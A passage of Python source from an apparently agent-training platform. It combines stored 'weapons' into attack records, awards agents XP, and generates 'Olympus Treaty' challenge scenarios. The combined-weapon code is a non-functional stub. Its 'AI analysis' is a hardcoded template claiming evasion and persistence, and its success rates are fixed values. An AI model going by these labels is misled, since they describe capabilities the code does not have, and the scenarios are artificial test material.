            avg_complexity = sum(complexity_scores) / len(complexity_scores)
            max_difficulty = max(difficulties, key=lambda x: ["easy", "medium", "hard", "expert"].index(x))
            
            # Generate combined name and description
            combined_name = f"The Arts: {', '.join(categories)}"
            combined_description = f"Advanced weapon combining {len(weapons)} techniques: {', '.join([w.get('name', 'Unknown') for w in weapons])}"
            
            # Generate AI analysis
            ai_analysis = await self._generate_weapon_analysis(weapons)
            
            # Create combined code
            combined_code = await self._generate_combined_code(weapons)
            
            return {
                "name": combined_name,
                "description": combined_description,
                "code": combined_code,
                "category": "combined_arts",
                "difficulty": max_difficulty,
                "complexity_score": min(10.0, avg_complexity * 1.5),
                "success_rate": 0.9,  # High success rate for combined weapons
                "usage_count": 0,
                "tags": ["combined", "advanced", "ai_enhanced"] + categories,
                "ai_analysis": ai_analysis,
                "source_weapons": [w.get("id") for w in weapons]
            }
            
        except Exception as e:
            logger.error(f"Error analyzing weapon combination: {str(e)}")
            return {}

    async def _generate_weapon_analysis(self, weapons: List[Dict[str, Any]]) -> str:
        """Generate AI analysis of weapon combination"""
        try:
            # Simulate AI analysis
            categories = [w.get("category", "general") for w in weapons]
            difficulties = [w.get("difficulty", "medium") for w in weapons]
            
            analysis = f"""
            AI Analysis of Combined Weapon:
            
            This weapon combines {len(weapons)} different attack techniques:
            - Categories: {', '.join(set(categories))}
            - Difficulty Range: {min(difficulties)} to {max(difficulties)}
            
            Capabilities:
            - Multi-vector attack approach
            - Enhanced evasion techniques
            - Improved success probability
            - Advanced persistence mechanisms
            
            Recommended Usage:
            - High-value target scenarios
            - Advanced penetration testing
            - Red team operations
            - APT simulation
            
            This combination creates a sophisticated attack framework that can adapt to various target environments and security postures.
            """
            
            return analysis.strip()
            
        except Exception as e:
            logger.error(f"Error generating weapon analysis: {str(e)}")
            return "AI analysis unavailable"

    async def _generate_combined_code(self, weapons: List[Dict[str, Any]]) -> str:
        """Generate combined code from multiple weapons"""
        try:
            combined_code = f"""
# The Arts - Combined Weapon
# Generated from {len(weapons)} individual weapons
# Categories: {', '.join(set([w.get('category', 'general') for w in weapons]))}

import subprocess
import time
import random

class CombinedWeapon:
    def __init__(self):
        self.weapons = {len(weapons)}
        self.success_rate = 0.9
        self.complexity = "advanced"
    
    def execute_attack(self, target):
        \"\"\"
        Execute combined attack using multiple techniques
        \"\"\"
        results = []
        
        for weapon in {[w.get('name', 'Unknown') for w in weapons]}:
            try:
                result = self._execute_weapon(weapon, target)
                results.append(result)
            except Exception as e:
                print(f"Error executing {{weapon}}: {{e}}")
        
        return self._analyze_results(results)
    
    def _execute_weapon(self, weapon_name, target):
        \"\"\"
        Execute individual weapon
        \"\"\"
        # Implementation would include actual weapon code
        return f"{{weapon_name}} executed successfully against {{target}}"
    
    def _analyze_results(self, results):
        \"\"\"
        Analyze and combine results
        \"\"\"
        return {{
            "success": len([r for r in results if "successfully" in r]) > 0,
            "results": results,
            "combined_effectiveness": 0.9
        }}

# Usage example
if __name__ == "__main__":
    weapon = CombinedWeapon()
    result = weapon.execute_attack("target_system")
    print(result)
"""
            
            return combined_code.strip()
            
        except Exception as e:
            logger.error(f"Error generating combined code: {str(e)}")
            return "# Combined weapon code generation failed"

    async def get_weapon_by_id(self, weapon_id: str) -> Optional[Dict[str, Any]]:
        """Get a specific weapon by ID"""
        try:
            conn = sqlite3.connect(self.weapons_db)
            cursor = conn.cursor()
            
            cursor.execute('SELECT * FROM weapons WHERE id = ?', (weapon_id,))
            row = cursor.fetchone()
            conn.close()
            
            if row:
                return {
                    "id": row[0],
                    "name": row[1],
                    "code": row[2],
                    "description": row[3],
                    "category": row[4],
                    "difficulty": row[5],
                    "complexity_score": row[6],
                    "success_rate": row[7],
                    "usage_count": row[8],
                    "created_at": row[9],
                    "last_used": row[10],
                    "tags": json.loads(row[11]) if row[11] else [],
                    "user_id": row[12]
                }
            
            return None
            
        except Exception as e:
            logger.error(f"Error getting weapon by ID: {str(e)}")
            return None

    async def update_agent_metrics(self, user_id: str, scenario_result: Dict[str, Any]) -> bool:
        """Update agent metrics with XP and learning score after scenario completion"""
        try:
            from app.services.agent_metrics_service import AgentMetricsService
            
            # Get the singleton instance
            agent_metrics_service = AgentMetricsService()
            
            # Calculate rewards
            xp_reward = scenario_result.get("xp_reward", 100)
            learning_increase = scenario_result.get("learning_score_increase", 0.1)
            success = scenario_result.get("success", False)
            
            # Update metrics
            updates = {
                "xp": xp_reward,
                "learning_score": learning_increase,
                "success_rate": 1.0 if success else 0.0,
                "total_learning_cycles": 1
            }
            
            # Update sandbox agent metrics
            success = await agent_metrics_service.update_specific_metrics("sandbox", updates)
            
            if success:
                logger.info(f"Updated agent metrics for sandbox: XP +{xp_reward}, Learning +{learning_increase}")
            
            return success
            
        except Exception as e:
            logger.error(f"Error updating agent metrics: {str(e)}")
            return False 

    async def generate_olympus_treaty_scenario(self, ai_type: str, difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate comprehensive Olympus Treaty scenarios with diverse test types"""
        try:
            # Define diverse scenario types
            scenario_types = [
                "puzzle_solving",
                "code_generation", 
                "system_analysis",
                "security_challenge",
                "algorithm_design",
                "architecture_planning",
                "debugging_challenge",
                "optimization_task",
                "integration_test",
                "creative_problem_solving"
            ]
            
            # Select scenario type based on AI type and difficulty
            selected_type = self._select_olympus_scenario_type(ai_type, difficulty, scenario_types)
            
            # Generate scenario based on type
            if selected_type == "puzzle_solving":
                scenario = await self._generate_olympus_puzzle_scenario(ai_type, difficulty, user_id)
            elif selected_type == "code_generation":
                scenario = await self._generate_olympus_code_scenario(ai_type, difficulty, user_id)
            elif selected_type == "system_analysis":
                scenario = await self._generate_olympus_system_scenario(ai_type, difficulty, user_id)
            elif selected_type == "security_challenge":
                scenario = await self._generate_olympus_security_scenario(ai_type, difficulty, user_id)
            elif selected_type == "algorithm_design":
                scenario = await self._generate_olympus_algorithm_scenario(ai_type, difficulty, user_id)
            elif selected_type == "architecture_planning":
                scenario = await self._generate_olympus_architecture_scenario(ai_type, difficulty, user_id)
            elif selected_type == "debugging_challenge":
                scenario = await self._generate_olympus_debugging_scenario(ai_type, difficulty, user_id)
            elif selected_type == "optimization_task":
                scenario = await self._generate_olympus_optimization_scenario(ai_type, difficulty, user_id)
            elif selected_type == "integration_test":
                scenario = await self._generate_olympus_integration_scenario(ai_type, difficulty, user_id)
            elif selected_type == "creative_problem_solving":
                scenario = await self._generate_olympus_creative_scenario(ai_type, difficulty, user_id)
            else:
                scenario = await self._generate_olympus_general_scenario(ai_type, difficulty, user_id)
            
            # Add Olympus Treaty specific metadata
            scenario["olympus_treaty"] = True
            scenario["test_type"] = selected_type
            scenario["ai_type"] = ai_type
            scenario["difficulty"] = difficulty
            scenario["user_id"] = user_id
            scenario["scenario_id"] = f"olympus_{ai_type}_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            scenario["live_environment"] = {
                "is_live": True,
                "real_vulnerabilities": True,
                "dynamic_content": True,
                "interactive_elements": True,
                "real_time_feedback": True,
                "container_id": f"olympus_{ai_type}_{user_id}_{random.randint(1000, 9999)}",
                "target_url": f"http://localhost:{8080 + random.randint(0, 9)}",
                "port": 8080 + random.randint(0, 9)
            }
            
            return scenario
            
        except Exception as e:
            logger.error(f"Error generating Olympus Treaty scenario: {str(e)}")
            return self._get_fallback_olympus_scenario(ai_type, difficulty, user_id)
    
    def _select_olympus_scenario_type(self, ai_type: str, difficulty: str, scenario_types: List[str]) -> str:
        """Select appropriate scenario type based on AI type and difficulty"""
        # AI type preferences
        ai_preferences = {
            "imperium": ["system_analysis", "architecture_planning", "integration_test"],
            "guardian": ["security_challenge", "debugging_challenge", "system_analysis"],
            "sandbox": ["creative_problem_solving", "algorithm_design", "puzzle_solving"],
            "conquest": ["code_generation", "optimization_task", "integration_test"]
        }
        
        # Difficulty preferences
        difficulty_preferences = {
            "easy": ["puzzle_solving", "code_generation", "debugging_challenge"],
            "medium": ["system_analysis", "optimization_task", "security_challenge"],
            "hard": ["architecture_planning", "algorithm_design", "integration_test"],
            "expert": ["creative_problem_solving", "system_analysis", "architecture_planning"]
        }
        
        # Get preferences for this AI type and difficulty
        ai_preferred = ai_preferences.get(ai_type, scenario_types)
        difficulty_preferred = difficulty_preferences.get(difficulty, scenario_types)
        
        # Combine preferences and select
        combined_preferences = list(set(ai_preferred) & set(difficulty_preferred))
        if combined_preferences:
            return random.choice(combined_preferences)
        elif ai_preferred:
            return random.choice(ai_preferred)
        else:
            return random.choice(scenario_types)
    
    async def _generate_olympus_puzzle_scenario(self, ai_type: str, difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate puzzle-solving Olympus Treaty scenario"""
        puzzles = {
            "easy": {
                "name": "Logic Gate Puzzle",
                "description": "Design a logic circuit that implements a specific truth table using only NAND gates.",
                "objective": "Create a working logic circuit that produces the correct output for all input combinations.",
                "constraints": ["Use only NAND gates", "Minimize gate count", "Ensure correct timing"],
                "success_criteria": ["All truth table outputs correct", "Circuit uses minimal gates", "Timing requirements met"]
            },
            "medium": {
                "name": "Algorithm Optimization Puzzle",
                "description": "Optimize a given algorithm to reduce time complexity from O(n²) to O(n log n) while maintaining correctness.",
                "objective": "Transform the algorithm to achieve better performance without changing the output.",
                "constraints": ["Maintain exact same output", "Use only standard data structures", "Document all changes"],
                "success_criteria": ["Time complexity improved", "Output identical to original", "Code is readable and documented"]
            },
            "hard": {
                "name": "Distributed System Puzzle",
                "description": "Design a distributed consensus algorithm that can handle network partitions and node failures.",
                "objective": "Create a fault-tolerant consensus mechanism that ensures data consistency across nodes.",
                "constraints": ["Handle up to 3 node failures", "Maintain consistency", "Minimize message overhead"],
                "success_criteria": ["Consensus achieved despite failures", "No data inconsistency", "Efficient message passing"]
            },
            "expert": {
                "name": "Quantum Computing Puzzle",
                "description": "Design a quantum algorithm to solve a specific optimization problem using quantum superposition and entanglement.",
                "objective": "Leverage quantum properties to achieve exponential speedup over classical algorithms.",
                "constraints": ["Use quantum gates", "Minimize qubit count", "Ensure quantum advantage"],
                "success_criteria": ["Quantum advantage demonstrated", "Algorithm is implementable", "Correctness proven"]
            }
        }
        
        puzzle = puzzles.get(difficulty, puzzles["medium"])
        return {
            "name": f"Olympus Treaty: {puzzle['name']}",
            "description": puzzle["description"],
            "objective": puzzle["objective"],
            "constraints": puzzle["constraints"],
            "success_criteria": puzzle["success_criteria"],
            "complexity_score": {"easy": 3.0, "medium": 6.0, "hard": 8.5, "expert": 9.5}.get(difficulty, 6.0),
            "estimated_duration": {"easy": "30-60 minutes", "medium": "1-2 hours", "hard": "2-4 hours", "expert": "4-8 hours"}.get(difficulty, "1-2 hours")
        }
    
    async def _generate_olympus_code_scenario(self, ai_type: str, difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate code generation Olympus Treaty scenario"""
        code_scenarios = {
            "easy": {
                "name": "Data Structure Implementation",
                "description": "Implement a custom data structure (e.g., LRU Cache, Trie) with full functionality and test coverage.",
                "objective": "Create a working, efficient implementation with comprehensive tests.",
                "requirements": ["Implement all core methods", "Include unit tests", "Document API"],
                "success_criteria": ["All tests pass", "Performance benchmarks met", "Code is well-documented"]
            },
            "medium": {
                "name": "Design Pattern Implementation",
                "description": "Refactor existing code to implement a specific design pattern (e.g., Observer, Strategy, Factory).",
                "objective": "Apply design pattern principles to improve code structure and maintainability.",
                "requirements": ["Identify pattern applicability", "Refactor without breaking functionality", "Add pattern documentation"],
                "success_criteria": ["Pattern correctly implemented", "No functionality lost", "Code quality improved"]
            },
            "hard": {
                "name": "Concurrent System Design",
                "description": "Design and implement a concurrent system that handles multiple operations safely and efficiently.",
                "objective": "Create a thread-safe system with proper synchronization and error handling.",
                "requirements": ["Thread safety", "Deadlock prevention", "Performance optimization", "Error recovery"],
                "success_criteria": ["No race conditions", "Efficient resource usage", "Graceful error handling"]
            },
            "expert": {
                "name": "Domain-Specific Language",
                "description": "Design and implement a domain-specific language for a specific problem domain.",
                "objective": "Create a complete DSL with parser, interpreter, and development tools.",
                "requirements": ["Define language syntax", "Implement parser", "Create interpreter", "Build development tools"],
                "success_criteria": ["Language is usable", "Parser handles all valid inputs", "Interpreter executes correctly"]
            }
        }
        
        scenario = code_scenarios.get(difficulty, code_scenarios["medium"])
        return {
            "name": f"Olympus Treaty: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "complexity_score": {"easy": 4.0, "medium": 7.0, "hard": 9.0, "expert": 9.5}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "1-2 hours", "medium": "2-4 hours", "hard": "4-6 hours", "expert": "6-12 hours"}.get(difficulty, "2-4 hours")
        }
    
    async def _generate_olympus_system_scenario(self, ai_type: str, difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate system analysis Olympus Treaty scenario"""
        system_scenarios = {
            "easy": {
                "name": "Performance Analysis",
                "description": "Analyze a given system's performance bottlenecks and propose optimization strategies.",
                "objective": "Identify performance issues and provide actionable improvement recommendations.",
                "requirements": ["Profile system performance", "Identify bottlenecks", "Propose solutions"],
                "success_criteria": ["Bottlenecks identified", "Solutions are feasible", "Performance improvement demonstrated"]
            },
            "medium": {
                "name": "Scalability Assessment",
                "description": "Evaluate system scalability and design improvements for handling increased load.",
                "objective": "Assess current scalability limits and design horizontal/vertical scaling strategies.",
                "requirements": ["Analyze current architecture", "Identify scaling bottlenecks", "Design scaling strategy"],
                "success_criteria": ["Scaling strategy is viable", "Performance targets defined", "Implementation plan clear"]
            },
            "hard": {
                "name": "System Architecture Redesign",
                "description": "Redesign a monolithic system into a microservices architecture with proper service boundaries.",
                "objective": "Create a scalable, maintainable microservices architecture with clear service responsibilities.",
                "requirements": ["Define service boundaries", "Design APIs", "Plan data management", "Consider deployment"],
                "success_criteria": ["Services are cohesive", "APIs are well-designed", "Deployment strategy viable"]
            },
            "expert": {
                "name": "Distributed System Design",
                "description": "Design a globally distributed system with data consistency, fault tolerance, and low latency.",
                "objective": "Create a system that can operate across multiple regions with high availability and consistency.",
                "requirements": ["Global distribution", "Data consistency", "Fault tolerance", "Low latency"],
                "success_criteria": ["System is globally available", "Data consistency maintained", "Fault tolerance achieved"]
            }
        }
        
        scenario = system_scenarios.get(difficulty, system_scenarios["medium"])
        return {
            "name": f"Olympus Treaty: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "complexity_score": {"easy": 3.5, "medium": 6.5, "hard": 8.5, "expert": 9.5}.get(difficulty, 6.5),
            "estimated_duration": {"easy": "1-2 hours", "medium": "2-4 hours", "hard": "4-8 hours", "expert": "8-16 hours"}.get(difficulty, "2-4 hours")
        }
    
    async def _generate_olympus_security_scenario(self, ai_type: str, difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate security challenge Olympus Treaty scenario"""
        security_scenarios = {
            "easy": {
                "name": "Vulnerability Assessment",
                "description": "Perform a security assessment of a given codebase and identify potential vulnerabilities.",
                "objective": "Find security vulnerabilities and provide remediation recommendations.",
                "requirements": ["Static code analysis", "Dynamic testing", "Vulnerability classification"],
                "success_criteria": ["Vulnerabilities identified", "Risk levels assessed", "Remediation plan provided"]
            },
            "medium": {
                "name": "Secure Code Implementation",
                "description": "Implement a secure authentication system with proper password handling and session management.",
                "objective": "Create a secure authentication system that follows security best practices.",
                "requirements": ["Password hashing", "Session management", "Input validation", "Error handling"],
                "success_criteria": ["Authentication is secure", "Best practices followed", "Vulnerabilities prevented"]
            },
            "hard": {
                "name": "Cryptographic System Design",
                "description": "Design and implement a cryptographic system for secure data transmission and storage.",
                "objective": "Create a robust cryptographic system with proper key management and encryption.",
                "requirements": ["Encryption algorithms", "Key management", "Secure protocols", "Implementation security"],
                "success_criteria": ["System is cryptographically secure", "Key management is robust", "Protocols are secure"]
            },
            "expert": {
                "name": "Advanced Persistent Threat Simulation",
                "description": "Design a system to detect and respond to advanced persistent threats in a network environment.",
                "objective": "Create a comprehensive threat detection and response system for APT scenarios.",
                "requirements": ["Threat detection", "Incident response", "Forensic capabilities", "Recovery procedures"],
                "success_criteria": ["Threats detected early", "Response is effective", "Recovery is complete"]
            }
        }
        
        scenario = security_scenarios.get(difficulty, security_scenarios["medium"])
        return {
            "name": f"Olympus Treaty: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "complexity_score": {"easy": 4.0, "medium": 7.0, "hard": 9.0, "expert": 9.5}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "1-2 hours", "medium": "2-4 hours", "hard": "4-8 hours", "expert": "8-16 hours"}.get(difficulty, "2-4 hours")
        }
    
    async def _generate_olympus_algorithm_scenario(self, ai_type: str, difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate algorithm design Olympus Treaty scenario"""
        algorithm_scenarios = {
            "easy": {
                "name": "Sorting Algorithm Optimization",
                "description": "Optimize a given sorting algorithm for specific data characteristics and constraints.",
                "objective": "Improve algorithm performance while maintaining correctness for given data patterns.",
                "requirements": ["Analyze data characteristics", "Optimize algorithm", "Maintain correctness"],
                "success_criteria": ["Performance improved", "Correctness maintained", "Optimization justified"]
            },
            "medium": {
                "name": "Graph Algorithm Design",
                "description": "Design and implement algorithms for solving complex graph problems efficiently.",
                "objective": "Create efficient algorithms for graph traversal, pathfinding, and optimization problems.",
                "requirements": ["Graph representation", "Algorithm design", "Complexity analysis", "Implementation"],
                "success_criteria": ["Algorithms are efficient", "Correctness proven", "Implementation works"]
            },
            "hard": {
                "name": "Machine Learning Algorithm",
                "description": "Design and implement a custom machine learning algorithm for a specific problem domain.",
                "objective": "Create a novel ML algorithm that outperforms existing solutions for the given problem.",
                "requirements": ["Algorithm design", "Mathematical foundation", "Implementation", "Evaluation"],
                "success_criteria": ["Algorithm is novel", "Performance is competitive", "Theory is sound"]
            },
            "expert": {
                "name": "Quantum Algorithm Design",
                "description": "Design quantum algorithms that leverage quantum properties for computational advantage.",
                "objective": "Create quantum algorithms that provide exponential speedup over classical counterparts.",
                "requirements": ["Quantum principles", "Algorithm design", "Complexity analysis", "Implementation"],
                "success_criteria": ["Quantum advantage achieved", "Algorithm is implementable", "Theory is rigorous"]
            }
        }
        
        scenario = algorithm_scenarios.get(difficulty, algorithm_scenarios["medium"])
        return {
            "name": f"Olympus Treaty: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "complexity_score": {"easy": 4.5, "medium": 7.5, "hard": 9.0, "expert": 9.5}.get(difficulty, 7.5),
            "estimated_duration": {"easy": "1-2 hours", "medium": "2-4 hours", "hard": "4-8 hours", "expert": "8-16 hours"}.get(difficulty, "2-4 hours")
        }
    
    async def _generate_olympus_architecture_scenario(self, ai_type: str, difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate architecture planning Olympus Treaty scenario"""
        architecture_scenarios = {
            "easy": {
                "name": "Component Architecture Design",
                "description": "Design a modular component architecture for a given application with clear interfaces.",
                "objective": "Create a well-structured component architecture that promotes maintainability and reusability.",
                "requirements": ["Component identification", "Interface design", "Dependency management"],
                "success_criteria": ["Components are cohesive", "Interfaces are clear", "Dependencies are minimal"]
            },
            "medium": {
                "name": "Service-Oriented Architecture",
                "description": "Design a service-oriented architecture with proper service boundaries and communication patterns.",
                "objective": "Create a scalable SOA that enables service reuse and system flexibility.",
                "requirements": ["Service identification", "API design", "Communication patterns", "Data management"],
                "success_criteria": ["Services are reusable", "APIs are well-designed", "System is scalable"]
            },
            "hard": {
                "name": "Event-Driven Architecture",
                "description": "Design an event-driven architecture for handling complex business processes and real-time data.",
                "objective": "Create a responsive, scalable system that can handle high-volume event processing.",
                "requirements": ["Event modeling", "Event routing", "Processing patterns", "Scalability design"],
                "success_criteria": ["System is responsive", "Events are processed correctly", "Scalability achieved"]
            },
            "expert": {
                "name": "Multi-Cloud Architecture",
                "description": "Design a multi-cloud architecture that provides high availability, cost optimization, and vendor independence.",
                "objective": "Create a resilient architecture that can operate across multiple cloud providers.",
                "requirements": ["Cloud provider selection", "Data distribution", "Load balancing", "Cost optimization"],
                "success_criteria": ["High availability achieved", "Costs are optimized", "Vendor independence maintained"]
            }
        }
        
        scenario = architecture_scenarios.get(difficulty, architecture_scenarios["medium"])
        return {
            "name": f"Olympus Treaty: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "complexity_score": {"easy": 4.0, "medium": 7.0, "hard": 8.5, "expert": 9.5}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "1-2 hours", "medium": "2-4 hours", "hard": "4-8 hours", "expert": "8-16 hours"}.get(difficulty, "2-4 hours")
        }
    
    async def _generate_olympus_debugging_scenario(self, ai_type: str, difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate debugging challenge Olympus Treaty scenario"""
        debugging_scenarios = {
            "easy": {
                "name": "Performance Debugging",
                "description": "Debug performance issues in a given application and optimize critical code paths.",
                "objective": "Identify and fix performance bottlenecks to improve application responsiveness.",
                "requirements": ["Profile application", "Identify bottlenecks", "Optimize code", "Measure improvement"],
                "success_criteria": ["Performance improved", "Bottlenecks resolved", "Improvement measured"]
            },
            "medium": {
                "name": "Concurrency Debugging",
                "description": "Debug race conditions and synchronization issues in a multi-threaded application.",
                "objective": "Identify and fix concurrency bugs while maintaining system performance.",
                "requirements": ["Reproduce race conditions", "Identify root cause", "Implement fixes", "Test thoroughly"],
                "success_criteria": ["Race conditions eliminated", "Performance maintained", "Tests pass consistently"]
            },
            "hard": {
                "name": "Distributed System Debugging",
                "description": "Debug issues in a distributed system with multiple components and network communication.",
                "objective": "Identify and resolve issues that span multiple system components and network boundaries.",
                "requirements": ["Trace distributed requests", "Identify failure points", "Implement fixes", "Test end-to-end"],
                "success_criteria": ["Issues resolved", "System stability improved", "Monitoring enhanced"]
            },
            "expert": {
                "name": "Security Vulnerability Debugging",
                "description": "Debug and fix security vulnerabilities in a complex system with multiple attack vectors.",
                "objective": "Identify, understand, and fix security vulnerabilities while maintaining system functionality.",
                "requirements": ["Vulnerability analysis", "Root cause identification", "Secure fix implementation", "Testing"],
                "success_criteria": ["Vulnerabilities fixed", "Security improved", "Functionality maintained"]
            }
        }
        
        scenario = debugging_scenarios.get(difficulty, debugging_scenarios["medium"])
        return {
            "name": f"Olympus Treaty: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "complexity_score": {"easy": 3.5, "medium": 6.5, "hard": 8.5, "expert": 9.0}.get(difficulty, 6.5),
            "estimated_duration": {"easy": "1-2 hours", "medium": "2-4 hours", "hard": "4-8 hours", "expert": "6-12 hours"}.get(difficulty, "2-4 hours")
        }
    
    async def _generate_olympus_optimization_scenario(self, ai_type: str, difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate optimization task Olympus Treaty scenario"""
        optimization_scenarios = {
            "easy": {
                "name": "Memory Optimization",
                "description": "Optimize memory usage in a given application to reduce footprint and improve performance.",
                "objective": "Reduce memory consumption while maintaining or improving application performance.",
                "requirements": ["Profile memory usage", "Identify waste", "Implement optimizations", "Measure improvement"],
                "success_criteria": ["Memory usage reduced", "Performance maintained", "Optimizations documented"]
            },
            "medium": {
                "name": "Database Query Optimization",
                "description": "Optimize database queries and schema design for improved performance and scalability.",
                "objective": "Improve query performance and database efficiency through optimization techniques.",
                "requirements": ["Analyze query performance", "Optimize queries", "Design indexes", "Test improvements"],
                "success_criteria": ["Query performance improved", "Indexes are effective", "Scalability enhanced"]
            },
            "hard": {
                "name": "System-Wide Optimization",
                "description": "Optimize an entire system across multiple components for maximum efficiency and performance.",
                "objective": "Achieve system-wide performance improvements through coordinated optimization efforts.",
                "requirements": ["System analysis", "Bottleneck identification", "Coordinated optimization", "Performance testing"],
                "success_criteria": ["System performance improved", "Bottlenecks resolved", "Efficiency increased"]
            },
            "expert": {
                "name": "AI/ML Model Optimization",
                "description": "Optimize machine learning models for inference speed, memory efficiency, and accuracy.",
                "objective": "Create optimized ML models that balance performance, efficiency, and accuracy requirements.",
                "requirements": ["Model analysis", "Optimization techniques", "Accuracy preservation", "Performance measurement"],
                "success_criteria": ["Inference speed improved", "Memory efficiency increased", "Accuracy maintained"]
            }
        }
        
        scenario = optimization_scenarios.get(difficulty, optimization_scenarios["medium"])
        return {
            "name": f"Olympus Treaty: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "complexity_score": {"easy": 4.0, "medium": 7.0, "hard": 8.5, "expert": 9.0}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "1-2 hours", "medium": "2-4 hours", "hard": "4-8 hours", "expert": "6-12 hours"}.get(difficulty, "2-4 hours")
        }
    
    async def _generate_olympus_integration_scenario(self, ai_type: str, difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate integration test Olympus Treaty scenario"""
        integration_scenarios = {
            "easy": {
                "name": "API Integration Testing",
                "description": "Design and implement comprehensive integration tests for a REST API with multiple endpoints.",
                "objective": "Create robust integration tests that validate API functionality and reliability.",
                "requirements": ["Test design", "API coverage", "Error scenarios", "Performance testing"],
                "success_criteria": ["All endpoints tested", "Error handling validated", "Performance benchmarks met"]
            },
            "medium": {
                "name": "Microservices Integration",
                "description": "Design integration patterns and tests for a microservices architecture with service communication.",
                "objective": "Create reliable integration between microservices with proper error handling and monitoring.",
                "requirements": ["Service communication", "Error handling", "Monitoring", "Testing strategy"],
                "success_criteria": ["Services integrate properly", "Errors handled gracefully", "Monitoring effective"]
            },
            "hard": {
                "name": "Third-Party System Integration",
                "description": "Design and implement integration with multiple third-party systems with different protocols and data formats.",
                "objective": "Create a robust integration layer that can handle multiple external systems reliably.",
                "requirements": ["Protocol handling", "Data transformation", "Error recovery", "Monitoring"],
                "success_criteria": ["All systems integrated", "Data consistency maintained", "Reliability achieved"]
            },
            "expert": {
                "name": "Real-Time System Integration",
                "description": "Design real-time integration systems that can handle high-volume, low-latency data processing.",
                "objective": "Create integration systems that can process real-time data with minimal latency and high reliability.",
                "requirements": ["Real-time processing", "Low latency", "High throughput", "Fault tolerance"],
                "success_criteria": ["Latency requirements met", "Throughput achieved", "Reliability maintained"]
            }
        }
        
        scenario = integration_scenarios.get(difficulty, integration_scenarios["medium"])
        return {
            "name": f"Olympus Treaty: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "complexity_score": {"easy": 4.5, "medium": 7.0, "hard": 8.5, "expert": 9.0}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "1-2 hours", "medium": "2-4 hours", "hard": "4-8 hours", "expert": "6-12 hours"}.get(difficulty, "2-4 hours")
        }
    
    async def _generate_olympus_creative_scenario(self, ai_type: str, difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate creative problem solving Olympus Treaty scenario"""
        creative_scenarios = {
            "easy": {
                "name": "User Experience Innovation",
                "description": "Design an innovative user experience for a complex application that improves usability and engagement.",
                "objective": "Create a novel UX design that solves usability problems and enhances user engagement.",
                "requirements": ["User research", "Design thinking", "Prototyping", "User testing"],
                "success_criteria": ["UX is innovative", "Usability improved", "User engagement increased"]
            },
            "medium": {
                "name": "Business Process Innovation",
                "description": "Redesign a business process using technology to improve efficiency and create new value propositions.",
                "objective": "Create innovative business processes that leverage technology for competitive advantage.",
                "requirements": ["Process analysis", "Technology assessment", "Innovation design", "Implementation planning"],
                "success_criteria": ["Process efficiency improved", "New value created", "Implementation plan viable"]
            },
            "hard": {
                "name": "Technology Architecture Innovation",
                "description": "Design an innovative technology architecture that solves complex business problems in novel ways.",
                "objective": "Create a breakthrough architecture that provides significant competitive advantages.",
                "requirements": ["Problem analysis", "Innovation research", "Architecture design", "Feasibility assessment"],
                "success_criteria": ["Architecture is innovative", "Problems solved effectively", "Implementation feasible"]
            },
            "expert": {
                "name": "Disruptive Technology Design",
                "description": "Design a disruptive technology solution that creates entirely new markets or transforms existing ones.",
                "objective": "Create a technology solution that has the potential to disrupt existing markets and create new opportunities.",
                "requirements": ["Market analysis", "Technology innovation", "Business model design", "Implementation strategy"],
                "success_criteria": ["Solution is disruptive", "Market potential identified", "Implementation strategy clear"]
            }
        }
        
        scenario = creative_scenarios.get(difficulty, creative_scenarios["medium"])
        return {
            "name": f"Olympus Treaty: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "complexity_score": {"easy": 4.0, "medium": 7.0, "hard": 8.5, "expert": 9.5}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "1-2 hours", "medium": "2-4 hours", "hard": "4-8 hours", "expert": "8-16 hours"}.get(difficulty, "2-4 hours")
        }
    
    async def _generate_olympus_general_scenario(self, ai_type: str, difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate general Olympus Treaty scenario as fallback"""
        return {
            "name": f"Olympus Treaty: Advanced {ai_type.title()} Challenge",
            "description": f"Complete a comprehensive challenge that tests {ai_type} AI capabilities across multiple domains including problem-solving, technical implementation, and strategic thinking.",
            "objective": "Demonstrate mastery of core competencies and ability to handle complex, multi-faceted challenges.",
            "requirements": ["Multi-domain expertise", "Problem-solving skills", "Technical implementation", "Strategic thinking"],
            "success_criteria": ["All objectives met", "High-quality solution", "Comprehensive documentation"],
            "complexity_score": {"easy": 4.0, "medium": 7.0, "hard": 8.5, "expert": 9.0}.get(difficulty, 7.0),
